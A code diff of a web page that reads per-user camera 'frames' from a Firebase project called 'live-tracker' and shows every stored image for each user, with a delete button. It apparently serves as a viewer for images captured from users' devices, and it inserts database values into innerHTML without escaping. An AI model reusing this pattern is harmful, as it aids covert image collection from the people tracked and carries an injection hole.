@@ -29,7 +29,11 @@ header{
   border-radius:10px;
 }
 
-img{width:100%;border-radius:10px;}
+img{
+  width:100%;
+  border-radius:10px;
+  margin-top:10px;
+}
 
 button{
   width:100%;
@@ -53,7 +57,6 @@ button{
 
 <script>
 
-/* 🔥 SAME FIREBASE CONFIG (NO CHANGE) */
 const firebaseConfig = {
   apiKey: "AIzaSyA5iHHvWOKZnKlZCZz57OALtSkfNdMmrE",
   authDomain: "live-tracker-554a7.firebaseapp.com",
@@ -71,39 +74,37 @@ const grid = document.getElementById("grid");
 
 db.ref("camera").on("value",(snap)=>{
 
-  try{
+  const data = snap.val() || {};
+  grid.innerHTML = "";
 
-    const data = snap.val() || {};
+  Object.keys(data).forEach(userId => {
 
-    grid.innerHTML = "";
+    const framesObj = data[userId]?.frames || {};
+    const frames = Object.values(framesObj);
 
-    const users = Object.keys(data);
+    let html = "";
 
-    if(users.length === 0){
-      grid.innerHTML = "<h3>No Users Found</h3>";
-      return;
-    }
-
-    users.forEach(userId=>{
-
-      const user = data[userId] || {};
-
-      const card = document.createElement("div");
-      card.className = "card";
-
-      card.innerHTML = `
-        <h3>👤 ${userId}</h3>
-        <img src="${user.frame || ''}">
-        <button onclick="deleteUser('${userId}')">DELETE</button>
+    frames.forEach((item, index) => {
+      html += `
+        <div>
+          <b>Image ${index + 1}</b>
+          <img src="${item.frame}">
+        </div>
       `;
-
-      grid.appendChild(card);
-
     });
 
-  }catch(e){
-    console.log(e);
-  }
+    const card = document.createElement("div");
+    card.className = "card";
+
+    card.innerHTML = `
+      <h3>👤 ${userId}</h3>
+      ${html}
+      <button onclick="deleteUser('${userId}')">DELETE</button>
+    `;
+
+    grid.appendChild(card);
+
+  });
 
 });
 
